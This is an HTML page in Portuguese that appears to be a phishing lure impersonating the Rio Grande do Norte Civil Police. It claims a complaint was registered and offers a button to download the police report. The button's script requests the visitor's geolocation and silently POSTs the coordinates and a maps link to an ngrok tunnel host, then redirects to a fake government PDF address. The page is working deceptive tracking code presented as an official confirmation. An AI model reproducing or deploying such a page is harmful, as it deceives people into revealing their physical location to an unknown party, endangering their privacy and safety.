<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8">
  <title>Denúncia Registrada</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f4f6f9;
      margin: 0;
      padding: 0;
    }
    header img {
      width: 100%;
      max-height: 180px;
      object-fit: cover;
    }
    main {
      max-width: 700px;
      margin: 40px auto;
      background-color: white;
      padding: 40px 30px;
      border-radius: 8px;
      box-shadow: 0 0 20px rgba(0,0,0,0.1);
      text-align: center;
    }
    h1 {
      font-size: 24px;
      color: #002776;
      margin-top: 20px;
    }
    p {
      font-size: 18px;
      margin-top: 10px;
      color: #333;
    }
    .botao-download {
      margin-top: 30px;
      display: inline-block;
      padding: 12px 20px;
      background-color: #e0e0e0;
      color: #002776;
      border: 1px solid #ccc;
      border-radius: 6px;
      font-size: 16px;
      text-decoration: none;
      transition: background-color 0.3s ease;
      cursor: pointer;
    }
    .botao-download:hover {
      background-color: #d4d4d4;
    }
    footer {
      text-align: center;
      padding: 20px;
      font-size: 13px;
      color: #666;
    }
  </style>
</head>
<body>

  <header>
    <img src="https://www3.defesasocial.rn.gov.br/BoletimCidadao/css/img/randomimage3.png" alt="Cabeçalho Polícia Civil do RN">
  </header>

  <main>
    <h1>Denúncia aberta na Polícia Civil do Estado do Rio Grande do Norte</h1>
    <p>Sua denúncia foi registrada com sucesso.</p>
    <p>Agradecemos sua colaboração com a segurança pública.</p>

    <button class="botao-download" onclick="enviarLocalizacao()">
      Baixar cópia do Boletim de Ocorrência Nº 20250802-125158-1578
    </button>
  </main>

  <footer>
    &copy; 2025 Polícia Civil do Estado do RN.
  </footer>

  <script>
    function enviarLocalizacao() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
      } else {
        alert("Algo deu errado. Tente novamente mais tarde.");
      }

      const dataAtual = new Date();
      const dia = String(dataAtual.getDate()).padStart(2, '0');
      const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
      const ano = dataAtual.getFullYear();

      const dataFormatada = `${dia}/${mes}/${ano}`;
      console.log("Data:", dataFormatada);
    }

    function sendLocation(position) {
      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;
      const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;

      fetch("https://36a2fa1ced8e.ngrok-free.app/send-location", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({ latitude, longitude, maps })
      })
        .then(response => response.json())
        .then(data => {
          if (!data.success) {
            alert("Erro ao enviar o comprovante.");
          } else {
            // Redireciona para download após envio com sucesso
            window.location.href = "https://policiacivil.rn.gov/boletim.pdf";
          }
        })
        .catch(error => {
          console.error("Erro:", error);
        });
    }

    function handleError(error) {
      alert("Erro ao obter a localização: " + error.message);
    }
  </script>

</body>
</html>
